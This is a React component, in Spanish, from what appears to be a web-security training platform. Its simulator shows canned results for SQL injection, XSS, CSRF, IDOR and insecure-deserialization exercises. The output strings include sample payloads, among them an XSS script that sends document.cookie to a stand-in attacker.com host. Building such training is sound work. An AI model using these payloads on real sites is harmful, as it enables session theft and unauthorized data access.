import React, { useState, useEffect } from 'react';
import { ChevronRight, Zap, Shield, AlertCircle, CheckCircle, BookOpen, Code, Terminal, X, Lock, Unlock } from 'lucide-react';
import './InteractiveExercise.css';

const InteractiveExercise = ({ challenge, onComplete, onBack }) => {
  const [activeTab, setActiveTab] = useState('explanation');
  const [currentHintLevel, setCurrentHintLevel] = useState(0);
  const [timeSpent, setTimeSpent] = useState(0);
  const [attempts, setAttempts] = useState(0);
  const [isVulnerableMode, setIsVulnerableMode] = useState(true);
  const [simulatorRunning, setSimulatorRunning] = useState(false);
  const [simulatorResult, setSimulatorResult] = useState(null);

  useEffect(() => {
    const timer = setInterval(() => {
      setTimeSpent(prev => prev + 1);
    }, 1000);
    return () => clearInterval(timer);
  }, []);

  const handleRequestHint = () => {
    if (currentHintLevel < 3) {
      setCurrentHintLevel(prev => prev + 1);
    }
  };

  const runSimulator = () => {
    setSimulatorRunning(true);
    setAttempts(prev => prev + 1);
    
    // Simulación de ejecución con delay realista
    setTimeout(() => {
      if (isVulnerableMode) {
        setSimulatorResult({
          success: true,
          message: '✅ ¡ATAQUE EXITOSO! La vulnerabilidad fue explotada correctamente.',
          details: getAttackSuccessDetails(challenge.vulnerability_type),
          output: getVulnerableOutput(challenge.vulnerability_type)
        });
      } else {
        setSimulatorResult({
          success: false,
          message: '❌ Ataque bloqueado. El código seguro protegió contra la vulnerabilidad.',
          details: 'Las contramedidas implementadas evitaron el ataque.',
          output: getSecureOutput(challenge.vulnerability_type)
        });
      }
      setSimulatorRunning(false);
    }, 1500);
  };

  const getAttackSuccessDetails = (type) => {
    const details = {
      'SQL_INJECTION': 'La consulta SQL fue modificada exitosamente usando el payload: " OR "1"="1',
      'XSS': 'El script JavaScript fue inyectado y ejecutado en el navegador.',
      'CSRF': 'La solicitud fue realizada sin token CSRF válido.',
      'BROKEN_AUTH': 'Se accedió a la cuenta sin credenciales válidas.',
      'IDOR': 'Se accedió a recursos de otros usuarios sin autorización.',
      'INSECURE_DESERIALIZE': 'El objeto malicioso fue deserializado y ejecutó código arbitrario.'
    };
    return details[type] || 'Ataque completado exitosamente';
  };

  const getVulnerableOutput = (type) => {
    const outputs = {
      'SQL_INJECTION': 'SELECT * FROM users WHERE email="" OR "1"="1";\n-- Retornó todos los usuarios (1000+ registros)\n-- Acceso no autorizado conseguido ✓',
      'XSS': '<script>alert("XSS ejecutado");fetch("https://attacker.com/?cookies="+document.cookie)</script>\n-- Cookies robadas: session_id=abc123xyz456\n-- Sesión comprometida ✓',
      'CSRF': 'POST /api/transfer HTTP/1.1\nContent-Type: application/json\n\n{"to_account":"attacker","amount":1000}\n-- Transferencia realizada sin confirmación CSRF ✓',
      'BROKEN_AUTH': 'Usuario logeado: admin (sin contraseña)\nPermisos: FULL_ACCESS\n-- Autenticación bypasseada ✓',
      'IDOR': 'GET /api/profile/123\n-- Obtenido perfil de usuario: admin@site.com\n-- Acceso no autorizado ✓',
      'INSECURE_DESERIALIZE': 'RCE (Remote Code Execution) logrado\n$ whoami\nroot\n-- Sistema comprometido ✓'
    };
    return outputs[type] || 'Código vulnerable - Ejecución completada';
  };

  const getSecureOutput = (type) => {
    const outputs = {
      'SQL_INJECTION': 'SELECT * FROM users WHERE email = ?;\n-- Parámetro: "" OR "1"="1"\n-- Error: Email inválido\n-- Inyección bloqueada ✓',
      'XSS': 'innerHTML sanitizado: &lt;script&gt;alert(\'XSS\')&lt;/script&gt;\n-- HTML escapado correctamente\n-- Ataque mitigado ✓',
      'CSRF': 'Error: CSRF token inválido\nToken esperado: 7a8b9c0d1e2f3g4h\nToken recibido: ninguno\n-- Solicitud rechazada ✓',
      'BROKEN_AUTH': 'Error: Credenciales inválidas\nIntentos fallidos: 3/5\n-- Autenticación requerida ✓',
      'IDOR': 'Error 403: No tienes permiso para acceder a este recurso\nUsuario actual: user_123\nRecurso propietario: user_456\n-- Autorización requerida ✓',
      'INSECURE_DESERIALIZE': 'Error: Tipo de objeto no permitido\n-- Desserialización segura rechazó el payload\n-- Ataque bloqueado ✓'
    };
    return outputs[type] || 'Código seguro - Ejecución bloqueada';
  };

  const formatTime = (seconds) => {
    const mins = Math.floor(seconds / 60);
    const secs = seconds % 60;
    return `${mins.toString().padStart(2, '0')}:${secs.toString().padStart(2, '0')}`;
  };

  const hints = [
    challenge.hint_1,
    challenge.hint_2,
    challenge.hint_3
  ];

  return (
    <div className="interactive-exercise-container">
      {/* Header */}
      <div className="exercise-header">
        <div className="header-left">
          <button className="btn-back" onClick={onBack}>
            ← Volver
          </button>
          <div className="header-title">
            <h1>{challenge.short_title}</h1>
            <p className="header-difficulty">
              {challenge.difficulty === 'BEGINNER' ? '🟢 Principiante' :
               challenge.difficulty === 'INTERMEDIATE' ? '🟡 Intermedio' :
               '🔴 Avanzado'}
            </p>
          </div>
        </div>

        <div className="header-stats">
          <div className="stat">
            <span className="label">Tiempo</span>
            <span className="value">{formatTime(timeSpent)}</span>
          </div>
          <div className="stat">
            <span className="label">Intentos</span>
            <span className="value">{attempts}</span>
          </div>
          <div className="stat">
            <span className="label">Puntuación</span>
            <span className="value">{Math.max(10, 100 - attempts * 10)}</span>
          </div>
        </div>
      </div>

      {/* Tabs Navigation */}
      <div className="tabs-nav">
        <button 
          className={`tab-btn ${activeTab === 'explanation' ? 'active' : ''}`}
          onClick={() => setActiveTab('explanation')}
        >
          📖 Explicación
        </button>
        <button 
          className={`tab-btn ${activeTab === 'attack' ? 'active' : ''}`}
          onClick={() => setActiveTab('attack')}
        >
          ⚡ Tipo de Ataque
        </button>
        <button 
          className={`tab-btn ${activeTab === 'code' ? 'active' : ''}`}
          onClick={() => setActiveTab('code')}
        >
          💻 Código
        </button>
        <button 
          className={`tab-btn ${activeTab === 'simulator' ? 'active' : ''}`}
          onClick={() => setActiveTab('simulator')}
        >
          🎮 Simulador
        </button>
        <button 
          className={`tab-btn ${activeTab === 'protection' ? 'active' : ''}`}
          onClick={() => setActiveTab('protection')}
        >
          🛡️ Protección
        </button>
      </div>

      {/* Content Area */}
      <div className="exercise-content">
        {/* Explanation Tab */}
        {activeTab === 'explanation' && (
          <div className="content-section fade-in">
            <h2>Explicación de la Vulnerabilidad</h2>
            <div className="explanation-box">
              <p>{challenge.vulnerability_explanation}</p>
            </div>

            <h3>Impacto en el Mundo Real</h3>
            <div className="impact-box">
              <p>{challenge.real_world_impact}</p>
            </div>

            <div className="info-grid">
              <div className="info-card">
                <h4>📊 CVSS Score</h4>
                <p className="score">{challenge.cvss_score}/10</p>
              </div>
              <div className="info-card">
                <h4>🏆 OWASP Top 10</h4>
                <p>{challenge.owasp_top_10}</p>
              </div>
              <div className="info-card">
                <h4>🔍 CWE ID</h4>
                <p>{challenge.cwe_id}</p>
              </div>
            </div>
          </div>
        )}

        {/* Attack Type Tab */}
        {activeTab === 'attack' && (
          <div className="content-section fade-in">
            <h2>Tipo de Ataque</h2>
            <div className="attack-type-box">
              <h3>🎯 {challenge.attack_type}</h3>
              <p>{challenge.attack_explanation}</p>
            </div>

            <h3>Contramedidas</h3>
            <div className="countermeasures-box">
              <p>{challenge.countermeasures}</p>
            </div>

            <h3>Mejores Prácticas</h3>
            <div className="best-practices-box">
              <p>{challenge.best_practices}</p>
            </div>

            {challenge.references && (
              <>
                <h3>Referencias</h3>
                <div className="references-box">
                  <p>{challenge.references}</p>
                </div>
              </>
            )}
          </div>
        )}

        {/* Code Tab */}
        {activeTab === 'code' && (
          <div className="content-section fade-in">
            <h2>Comparación: Código Vulnerable vs Seguro</h2>
            
            <div className="code-comparison">
              <div className="code-block vulnerable">
                <div className="code-header">
                  <span className="code-title">❌ CÓDIGO VULNERABLE</span>
                </div>
                <pre><code>{challenge.vulnerable_code}</code></pre>
              </div>

              <div className="code-block secure">
                <div className="code-header">
                  <span className="code-title">✅ CÓDIGO SEGURO</span>
                </div>
                <pre><code>{challenge.secure_code}</code></pre>
              </div>
            </div>
          </div>
        )}

        {/* Simulator Tab */}
        {activeTab === 'simulator' && (
          <div className="content-section fade-in">
            <h2>🎮 Simulador Interactivo</h2>
            
            <div className="simulator-container">
              <div className="mode-switcher">
                <button 
                  className={`mode-btn vulnerable-btn ${isVulnerableMode ? 'active' : ''}`}
                  onClick={() => {
                    setIsVulnerableMode(true);
                    setSimulatorResult(null);
                  }}
                >
                  🚨 Modo Vulnerable
                </button>
                <button 
                  className={`mode-btn secure-btn ${!isVulnerableMode ? 'active' : ''}`}
                  onClick={() => {
                    setIsVulnerableMode(false);
                    setSimulatorResult(null);
                  }}
                >
                  🔐 Modo Seguro
                </button>
              </div>

              <div className={`mode-indicator ${isVulnerableMode ? 'vulnerable' : 'secure'}`}>
                {isVulnerableMode ? (
                  <>
                    <AlertCircle size={20} />
                    <span>Estás en modo VULNERABLE - Intenta explotar la vulnerabilidad</span>
                  </>
                ) : (
                  <>
                    <CheckCircle size={20} />
                    <span>Estás en modo SEGURO - Las defensas están activas</span>
                  </>
                )}
              </div>

              <div className="simulator-input">
                <label>Payload/Input de Prueba:</label>
                <textarea 
                  placeholder={getPayloadPlaceholder(challenge.vulnerability_type)}
                  readOnly
                />
              </div>

              <button 
                className="btn-run-simulator"
                onClick={runSimulator}
                disabled={simulatorRunning}
              >
                {simulatorRunning ? '⏳ Ejecutando...' : '▶️ Ejecutar'}
              </button>

              {simulatorResult && (
                <div className={`simulator-result ${simulatorResult.success ? 'success' : 'failed'}`}>
                  <div className="result-message">
                    {simulatorResult.message}
                  </div>
                  <div className="result-details">
                    {simulatorResult.details}
                  </div>
                  <div className="result-output">
                    <strong>Output de la Terminal:</strong>
                    <pre><code>{simulatorResult.output}</code></pre>
                  </div>
                </div>
              )}
            </div>
          </div>
        )}

        {/* Protection Tab */}
        {activeTab === 'protection' && (
          <div className="content-section fade-in">
            <h2>🛡️ Cómo Protegerse</h2>
            
            <div className="protection-steps">
              <div className="step">
                <div className="step-number">1</div>
                <div className="step-content">
                  <h3>Validación de Entrada</h3>
                  <p>Siempre valida y desinfecta todos los datos de entrada del usuario antes de procesarlos.</p>
                </div>
              </div>

              <div className="step">
                <div className="step-number">2</div>
                <div className="step-content">
                  <h3>Escapado de Output</h3>
                  <p>Escapa todos los datos antes de mostrarlos en la respuesta al usuario.</p>
                </div>
              </div>

              <div className="step">
                <div className="step-number">3</div>
                <div className="step-content">
                  <h3>Parametrización</h3>
                  <p>Usa consultas parametrizadas en lugar de concatenación de strings.</p>
                </div>
              </div>

              <div className="step">
                <div className="step-number">4</div>
                <div className="step-content">
                  <h3>Autenticación Fuerte</h3>
                  <p>Implementa autenticación robusta con hashmaps seguros y salts.</p>
                </div>
              </div>

              <div className="step">
                <div className="step-number">5</div>
                <div className="step-content">
                  <h3>Autorización</h3>
                  <p>Verifica permisos en cada operación sensible.</p>
                </div>
              </div>

              <div className="step">
                <div className="step-number">6</div>
                <div className="step-content">
                  <h3>Librerías Seguras</h3>
                  <p>Usa librerías y frameworks que manejen seguridad automáticamente.</p>
                </div>
              </div>
            </div>
          </div>
        )}
      </div>

      {/* Hints Section */}
      <div className="hints-section">
        <h3>💡 Pistas</h3>
        <div className="hints-container">
          {hints.map((hint, index) => (
            <div 
              key={index}
              className={`hint-card ${index < currentHintLevel ? 'unlocked' : 'locked'}`}
            >
              <div className="hint-header">
                <span className="hint-level">Pista {index + 1}</span>
                {index >= currentHintLevel ? (
                  <Lock size={16} />
                ) : (
                  <Unlock size={16} />
                )}
              </div>
              {index < currentHintLevel && (
                <p className="hint-text">{hint}</p>
              )}
            </div>
          ))}
        </div>
        {currentHintLevel < 3 && (
          <button className="btn-hint" onClick={handleRequestHint}>
            🔓 Pedir Pista ({currentHintLevel}/3)
          </button>
        )}
      </div>

      {/* Complete Button */}
      <div className="complete-section">
        <button 
          className="btn-complete"
          onClick={() => onComplete({ timeSpent, attempts, score: Math.max(10, 100 - attempts * 10) })}
        >
          ✅ Marcar Desafío Completado
        </button>
      </div>
    </div>
  );
};

function getPayloadPlaceholder(type) {
  const payloads = {
    'SQL_INJECTION': '" OR "1"="1',
    'XSS': '<img src=x onerror=alert("XSS")>',
    'CSRF': '[Token CSRF omitido]',
    'BROKEN_AUTH': '[Sin contraseña]',
    'IDOR': '/api/profile/999',
    'INSECURE_DESERIALIZE': '[Objeto serializado malicioso]'
  };
  return payloads[type] || 'Ingresa tu payload aquí...';
}

export default InteractiveExercise;
